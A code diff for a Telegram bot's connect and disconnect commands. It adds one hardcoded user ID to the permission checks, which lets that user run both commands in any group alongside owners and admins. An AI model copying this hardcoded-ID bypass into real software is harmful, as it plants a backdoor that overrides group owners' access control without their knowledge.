@@ -32,9 +32,9 @@ async def connect(bot, message):
     # Debugging: Check admin and group owner IDs
     print(f"Message Sender ID: {message.from_user.id}, Group Owner ID: {user_id}")
     
-    # Check if the user is the group owner or an admin
-    if not (await is_admin(bot, message.chat.id, message.from_user.id) or message.from_user.id == user_id):
-        return await m.edit(f"Only {user_name} (Group Owner) or group admins can use this command 😁")
+    # Check if the user is the group owner, an admin, or the specific user with ID 6605647659
+    if not (await is_admin(bot, message.chat.id, message.from_user.id) or message.from_user.id == user_id or message.from_user.id == 6605647659):
+        return await m.edit(f"Only {user_name} (Group Owner), group admins, or the user with ID 6605647659 can use this command 😁")
     
     if not verified:
         return await m.edit("This chat is not verified!\nUse /verify")
@@ -79,9 +79,9 @@ async def disconnect(bot, message):
         print(f"Error fetching group details: {e}")
         return await bot.leave_chat(message.chat.id)
     
-    # Check if the user is the group owner or an admin
-    if not (await is_admin(bot, message.chat.id, message.from_user.id) or message.from_user.id == user_id):
-        return await m.edit(f"Only {user_name} (Group Owner) or group admins can use this command 😁")
+    # Check if the user is the group owner, an admin, or the specific user with ID 6605647659
+    if not (await is_admin(bot, message.chat.id, message.from_user.id) or message.from_user.id == user_id or message.from_user.id == 6605647659):
+        return await m.edit(f"Only {user_name} (Group Owner), group admins, or the user with ID 6605647659 can use this command 😁")
     
     if not verified:
         return await m.edit("This chat is not verified!\nUse /verify")
